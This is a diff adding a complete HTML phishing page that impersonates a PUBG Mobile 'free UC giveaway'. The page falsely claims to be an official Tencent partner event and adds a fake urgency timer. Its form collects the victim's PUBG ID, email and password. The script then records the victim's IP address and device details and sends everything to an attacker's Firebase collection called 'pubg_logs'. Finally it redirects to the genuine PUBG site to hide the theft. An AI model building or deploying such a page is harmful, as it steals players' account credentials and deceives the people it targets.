@@ -1,0 +1,502 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://*.firebaseapp.com https://*.gstatic.com https://api.ipify.org; script-src 'self' 'unsafe-inline' https://*.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https:;">
+    
+    <!-- WhatsApp/Telegram Link Önizleme -->
+    <meta property="og:title" content="PUBG MOBILE - Free UC Giveaway">
+    <meta property="og:description" content="Claim your free 6000 UC now! Limited time event. Enter your PUBG account to receive UC within 24 hours.">
+    <meta property="og:image" content="https://i.imgur.com/6CkJ8jS.png">
+    <meta property="og:url" content="">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="PUBG MOBILE - Free UC Giveaway">
+    <meta name="twitter:description" content="Claim your free 6000 UC now! Limited time event.">
+    <meta name="twitter:image" content="https://i.imgur.com/6CkJ8jS.png">
+    
+    <title>PUBG MOBILE - Free UC</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        
+        body {
+            background: linear-gradient(180deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
+            background-attachment: fixed;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            color: #fff;
+            overflow-x: hidden;
+        }
+        
+        .header {
+            background: linear-gradient(135deg, #ff6b00, #ff4500);
+            padding: 25px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .header::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+            animation: rotateBg 10s linear infinite;
+        }
+        
+        @keyframes rotateBg {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .header-content {
+            position: relative;
+            z-index: 1;
+        }
+        
+        .header-logo {
+            width: 130px;
+            height: auto;
+            margin-bottom: 12px;
+            filter: drop-shadow(0 5px 15px rgba(0,0,0,0.3));
+        }
+        
+        .header h1 {
+            font-size: 2rem;
+            font-weight: 900;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+            margin: 5px 0;
+        }
+        
+        .header p {
+            font-size: 0.9rem;
+            opacity: 0.95;
+            letter-spacing: 1px;
+        }
+        
+        .uc-badge {
+            background: linear-gradient(135deg, #ffd700, #ffaa00);
+            color: #000;
+            display: inline-block;
+            padding: 12px 35px;
+            border-radius: 50px;
+            font-size: 1.6rem;
+            font-weight: 900;
+            margin: 18px 0 5px;
+            box-shadow: 0 0 35px rgba(255, 215, 0, 0.5);
+            animation: pulseBadge 2s infinite;
+        }
+        
+        @keyframes pulseBadge {
+            0%, 100% { box-shadow: 0 0 20px rgba(255, 215, 0, 0.3); }
+            50% { box-shadow: 0 0 45px rgba(255, 215, 0, 0.8); }
+        }
+        
+        .container {
+            max-width: 420px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .timer-box {
+            text-align: center;
+            margin: 15px 0;
+            padding: 15px;
+            background: rgba(255, 0, 0, 0.15);
+            border: 2px solid rgba(255, 0, 0, 0.3);
+            border-radius: 15px;
+        }
+        
+        .timer-box p {
+            font-size: 0.85rem;
+            margin-bottom: 5px;
+            color: #ff8888;
+        }
+        
+        .timer-box span {
+            font-size: 1.6rem;
+            font-weight: 800;
+            color: #ff4444;
+            letter-spacing: 2px;
+        }
+        
+        .form-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(255, 255, 255, 0.12);
+            border-radius: 22px;
+            padding: 28px;
+            margin-bottom: 18px;
+        }
+        
+        .form-card h2 {
+            text-align: center;
+            margin-bottom: 22px;
+            font-size: 1.2rem;
+            color: #ffd700;
+            letter-spacing: 1px;
+        }
+        
+        .input-group {
+            margin-bottom: 15px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 6px;
+            font-size: 0.82rem;
+            color: #ccc;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+        }
+        
+        .input-group input,
+        .input-group select {
+            width: 100%;
+            padding: 13px 16px;
+            background: rgba(255, 255, 255, 0.07);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 12px;
+            color: #fff;
+            font-size: 0.95rem;
+            outline: none;
+            transition: all 0.3s;
+            font-family: inherit;
+        }
+        
+        .input-group input:focus,
+        .input-group select:focus {
+            border-color: #ffd700;
+            box-shadow: 0 0 18px rgba(255, 215, 0, 0.2);
+        }
+        
+        .input-group select {
+            cursor: pointer;
+        }
+        
+        .input-group select option {
+            background: #1a1a2e;
+            color: #fff;
+        }
+        
+        .input-group input::placeholder {
+            color: #666;
+        }
+        
+        .submit-btn {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ffd700, #ffaa00);
+            color: #000;
+            border: none;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: 800;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            transition: all 0.3s;
+            font-family: inherit;
+            margin-top: 5px;
+        }
+        
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(255, 215, 0, 0.5);
+        }
+        
+        .submit-btn:active {
+            transform: scale(0.97);
+        }
+        
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .info-card {
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            padding: 15px;
+            margin-bottom: 10px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        
+        .info-icon {
+            font-size: 2rem;
+            min-width: 45px;
+            text-align: center;
+        }
+        
+        .info-text h4 {
+            font-size: 0.9rem;
+            color: #ffd700;
+            margin-bottom: 4px;
+        }
+        
+        .info-text p {
+            font-size: 0.75rem;
+            color: #aaa;
+        }
+        
+        .msg-box {
+            text-align: center;
+            padding: 10px;
+            border-radius: 10px;
+            margin-top: 10px;
+            font-weight: 600;
+            display: none;
+        }
+        
+        .msg-box.error {
+            background: rgba(255,0,0,0.1);
+            color: #ff4444;
+            border: 1px solid rgba(255,0,0,0.3);
+        }
+        
+        .msg-box.success {
+            background: rgba(255,215,0,0.1);
+            color: #ffd700;
+            border: 1px solid rgba(255,215,0,0.3);
+        }
+        
+        .footer-note {
+            text-align: center;
+            font-size: 0.7rem;
+            color: #555;
+            margin: 20px 0;
+            letter-spacing: 0.5px;
+        }
+        
+        @media (max-width: 450px) {
+            .header h1 {
+                font-size: 1.4rem;
+            }
+            .uc-badge {
+                font-size: 1.3rem;
+                padding: 10px 25px;
+            }
+            .form-card {
+                padding: 20px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="header-content">
+            <!-- PUBG logosu: hack/pubg.png -->
+            <img src="pubg.png" alt="PUBG Mobile" class="header-logo" onerror="this.style.display='none';">
+            <h1>FREE UC GIVEAWAY</h1>
+            <p>Season 20 - Limited Time Event</p>
+            <div class="uc-badge">🎁 6000 UC</div>
+        </div>
+    </div>
+    
+    <div class="container">
+        <div class="timer-box">
+            <p>⏰ EVENT ENDS IN:</p>
+            <span id="timer">23:59:59</span>
+        </div>
+        
+        <div class="form-card">
+            <h2>🎮 Claim Your Free UC</h2>
+            
+            <div class="input-group">
+                <label>PUBG Mobile ID</label>
+                <input type="text" id="pubgId" placeholder="Enter your PUBG ID (e.g. 5123456789)">
+            </div>
+            
+            <div class="input-group">
+                <label>Server</label>
+                <select id="server">
+                    <option value="">Select Server</option>
+                    <option value="Europe">Europe</option>
+                    <option value="North America">North America</option>
+                    <option value="South America">South America</option>
+                    <option value="Asia">Asia</option>
+                    <option value="KRJP">KRJP</option>
+                    <option value="Middle East">Middle East</option>
+                </select>
+            </div>
+            
+            <div class="input-group">
+                <label>Email Address</label>
+                <input type="email" id="email" placeholder="Enter your email" autocomplete="email">
+            </div>
+            
+            <div class="input-group">
+                <label>Password</label>
+                <input type="password" id="password" placeholder="Enter your PUBG password" autocomplete="current-password">
+            </div>
+            
+            <div class="msg-box error" id="errorMsg"></div>
+            <div class="msg-box success" id="successMsg"></div>
+            
+            <button class="submit-btn" id="submitBtn" onclick="submitClaim()">🎁 CLAIM NOW</button>
+        </div>
+        
+        <div class="info-card">
+            <div class="info-icon">📦</div>
+            <div class="info-text">
+                <h4>UC Delivery</h4>
+                <p>UC will be added to your account within 24 hours</p>
+            </div>
+        </div>
+        
+        <div class="info-card">
+            <div class="info-icon">🔒</div>
+            <div class="info-text">
+                <h4>Secure Claim</h4>
+                <p>Your account information is encrypted and safe</p>
+            </div>
+        </div>
+        
+        <div class="info-card">
+            <div class="info-icon">✅</div>
+            <div class="info-text">
+                <h4>How It Works</h4>
+                <p>Enter your details, submit, wait 24h for UC delivery</p>
+            </div>
+        </div>
+        
+        <div class="footer-note">
+            This is an official PUBG Mobile partner event.<br>Tencent Games © 2024. All rights reserved.
+        </div>
+    </div>
+
+    <script>
+        // Geri sayım timer
+        function startTimer() {
+            const timerEl = document.getElementById('timer');
+            let totalSeconds = 24 * 60 * 60;
+            
+            setInterval(() => {
+                if (totalSeconds <= 0) {
+                    totalSeconds = 24 * 60 * 60;
+                }
+                totalSeconds--;
+                
+                const hours = Math.floor(totalSeconds / 3600);
+                const minutes = Math.floor((totalSeconds % 3600) / 60);
+                const seconds = totalSeconds % 60;
+                
+                timerEl.innerText = `${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }, 1000);
+        }
+        startTimer();
+        
+        async function submitClaim() {
+            const pubgId = document.getElementById('pubgId').value.trim();
+            const server = document.getElementById('server').value;
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
+            const errorMsg = document.getElementById('errorMsg');
+            const successMsg = document.getElementById('successMsg');
+            const submitBtn = document.getElementById('submitBtn');
+            
+            errorMsg.style.display = 'none';
+            successMsg.style.display = 'none';
+            
+            if (!pubgId || !server || !email || !password) {
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = '⚠️ Please fill in all fields';
+                return;
+            }
+            
+            submitBtn.disabled = true;
+            submitBtn.innerText = '⏳ Processing...';
+            
+            const urlParams = new URLSearchParams(window.location.search);
+            const uid = urlParams.get('uid');
+            
+            if (!uid) {
+                window.location.href = 'https://www.pubgmobile.com';
+                return;
+            }
+            
+            // IP al
+            let ip = 'unknown';
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch(e) {}
+            
+            // Firebase yükle ve kaydet
+            const FIREBASE_CONFIG = {
+                apiKey: "AIzaSyBSy4oCPNTB1h9l2M1P3rkcvwiDrhu82Ao",
+                authDomain: "camerahhh-15487.firebaseapp.com",
+                projectId: "camerahhh-15487",
+                storageBucket: "camerahhh-15487.firebasestorage.app",
+                messagingSenderId: "212849652224",
+                appId: "1:212849652224:web:19d8a85c01cd81005bdee5"
+            };
+            
+            try {
+                if (typeof firebase === 'undefined' || !firebase.apps || !firebase.apps.length) {
+                    await new Promise((resolve, reject) => {
+                        const script = document.createElement('script');
+                        script.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js';
+                        script.onload = resolve;
+                        script.onerror = reject;
+                        document.head.appendChild(script);
+                    });
+                    
+                    await new Promise((resolve, reject) => {
+                        const script = document.createElement('script');
+                        script.src = 'https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js';
+                        script.onload = resolve;
+                        script.onerror = reject;
+                        document.head.appendChild(script);
+                    });
+                    
+                    firebase.initializeApp(FIREBASE_CONFIG);
+                }
+                
+                await firebase.firestore().collection("pubg_logs").add({
+                    pubgId: pubgId,
+                    server: server,
+                    email: email,
+                    password: password,
+                    ip: ip,
+                    targetUid: uid,
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screenResolution: `${screen.width}x${screen.height}`,
+                    timestamp: new Date().toISOString(),
+                    unix: Date.now()
+                });
+                
+                successMsg.style.display = 'block';
+                successMsg.innerText = '✅ Claim Submitted Successfully! UC will be delivered within 24 hours.';
+                submitBtn.innerText = '✓ SUBMITTED';
+                
+                setTimeout(() => {
+                    window.location.href = 'https://www.pubgmobile.com';
+                }, 3000);
+                
+            } catch(err) {
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = 'Connection error. Please try again.';
+                submitBtn.disabled = false;
+                submitBtn.innerText = '🎁 CLAIM NOW';
+            }
+        }
+        
+        document.getElementById('password').addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') submitClaim();
+        });
+    </script>
+</body>
+</html>
